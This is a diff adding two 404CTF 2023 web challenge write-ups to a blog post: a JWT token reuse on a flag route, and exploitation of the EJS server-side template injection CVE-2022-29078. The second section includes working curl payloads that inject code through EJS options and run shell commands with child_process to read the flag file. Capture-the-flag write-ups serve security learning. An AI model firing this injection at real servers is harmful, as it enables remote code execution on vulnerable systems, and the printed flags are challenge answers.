@@ -236,3 +236,93 @@ main();
 If the try that url, we get the human rights declaration and in the bottom of the page, the flag:
 ![](/static/media/404ctf/fuite-en-1791-3.png)
  
+### L'Épistolaire moderne
+
+In this challenge, we encounter a Single Page Application (SPA) that initially allows us to log in.
+However, the login mechanism seems to be well-protected against SQL injections, and the `admin` user is deactivated.
+
+Upon successful login, we enter a chatroom where we interact with a princess.
+Sending random messages triggers various responses, some hinting that obtaining the flag won't be as simple as it seems.
+
+Exploring the chat's features, I noticed that it can preview the titles of links. While attempting to leverage this capability for Server-Side Request Forgery (SSRF) attacks, I hit a dead end.
+
+In the end, I concluded that there is nothing I can get out from this chat and turned my attention to the source code / cookies.
+
+Here are my observations:
+- There is a route to get the flag: `api/bgfmwqgccmk`
+- This route is protected by a JWT token (for example, without my JWT authentication, I get a 403 response)
+- I tried common attacks against the token but none worked
+- There are routes for getting the images used by the website, these route are also protected by a JWT token
+- The token used to access these route is **different from the JWT token assigned to my session**
+
+So I tried the obvious thing, try to get the flag using these "privileged" tokens and it worked !
+
+![](/static/media/404ctf/episolaire-moderne-1.png)
+
+Here is the flag: `404CTF{L34k_d3_C00k13s_s3cr3ts}`
+
+### Chanson d'India
+
+Chanson d'India was a captivating challenge that felt incredibly realistic.
+
+Although I can't provide any in-progress details since I'm writing this post after the challenge has ended, fortunately, the organizers of 404CTF have shared a helpful GIF demonstrating the challenge
+
+![](https://github.com/HackademINT/404CTF-2023/blob/main/Web/ChansonDInde/write_up/Walkthrough.gif)
+
+When can find their writeup [here](https://github.com/HackademINT/404CTF-2023/blob/main/Web/ChansonDInde/WRITE-UP.md).
+
+#### Initial approach
+
+Initially, I attempted to find a template injection vulnerability by exploring the input that generates an `audio` element, but my efforts were unsuccessful.
+
+I decided to switch gears and focus on scraping the website for potential clues.
+
+#### Finding clues
+
+A valuable page to inspect on any website is `/robots.txt`, which discloses which URLs the search engine crawlers can access.
+
+```
+User-agent: *
+Allow: /
+Allow: /scene
+Disallow: /CHANGELOG.md
+```
+
+Surprisingly, I discovered the presence of a /CHANGELOG.md route
+Although it's usually not publicly available, except for open-source projects, it seemed suspicious for this website. I hoped to find a hint here.
+
+Reading the CHANGELOG.md, I gathered the following information:
+
+- the website has been online since 31/06/2020
+- the website was vulnerable to an SSTI until 24/08/2020
+- the website uses an Express backend (NodeJS) updated on 01/05/2023
+- the website uses a package named EJS updated on 15/02/2021
+- the URL parser is express-validator installed on 13/11/2020
+
+#### Finding the vulnerability
+
+Next, I explored the [Snyk vulnerability database](https://security.snyk.io/) for potential exploits, taking into consideration the update dates of the components.
+
+My search bore fruit as I found CVE-2022-29078, affecting ejs versions below 3.1.7, which enables Remote Code Execution (RCE).
+
+Snyk also demonstrates how to exploit it and in this case, it looks like this:
+
+```bash
+curl -X POST "https://chanson-d-inde.challenges.404ctf.fr/scene" -d "url=www.google.com&delimiter=x&debug=true&settings[view options][outputFunctionName]=_;MYCODE;_"
+```
+
+The `url` parameter to pass the audio URL I wanted to play but the other parameters directly influence `ejs`.
+
+#### Exploiting the vulnerability
+
+The vulnerability allowed us to run shell commands using NodeJS's `child_process` module.
+
+Although there was a more subtle method involving the `__append` function to concatenate the input to the template, I wasn't aware of it during the CTF and I opted for a less stealthy approach using error throwing.
+
+```bash
+curl -X POST "https://chanson-d-inde.challenges.404ctf.fr/scene" -d "url=www.google.com&delimiter=x&debug=true&settings[view options][outputFunctionName]=_;process.mainModule.require('child_process').execSync('python3 -c \"import sys; raise BaseException(sys.argv[1])\" \$(grep 404CTF flag/flag.txt)');_"
+```
+
+Which returns the flag: `404CTF{v01la_Ind14_S0ng_s3_tErm1n3}`.
+
+*PS: I found this route by running `ls` commands using the same template.*
